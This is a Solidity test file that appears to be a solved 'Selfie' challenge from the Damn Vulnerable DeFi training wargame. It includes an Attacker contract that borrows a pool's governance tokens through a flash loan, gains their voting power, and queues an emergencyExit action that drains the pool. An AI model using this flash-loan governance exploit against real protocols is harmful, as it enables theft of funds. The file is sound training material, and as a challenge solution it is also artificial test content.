// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console, Vm} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool, IERC3156FlashBorrower} from "../../src/selfie/SelfiePool.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Attacker attacker =
            new Attacker(address(pool), address(token), address(governance), recovery, token.balanceOf(address(pool)));

        vm.recordLogs();
        attacker.attack();

        vm.warp(block.timestamp + 2 days);

        Vm.Log[] memory entries = vm.getRecordedLogs();
        uint256 actionId;
        for (uint256 i = 0; i < entries.length; i++) {
            if (entries[i].topics[0] == keccak256("ActionQueued(uint256,address)")) {
                // Decode the emitted data
                actionId = abi.decode(entries[i].data, (uint256));
            }
        }
        governance.executeAction(actionId);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Attacker is IERC3156FlashBorrower {
    SelfiePool pool;
    DamnValuableVotes token;
    SimpleGovernance governance;
    uint256 balance;
    address recovery;

    constructor(address _pool, address _token, address _governance, address _recovery, uint256 _balance) {
        pool = SelfiePool(_pool);
        token = DamnValuableVotes(_token);
        governance = SimpleGovernance(_governance);
        recovery = _recovery;
        balance = _balance;
    }

    function attack() external {
        pool.flashLoan(this, address(token), balance, "");
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        token.delegate(address(this));
        governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));
        token.approve(address(pool), balance);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
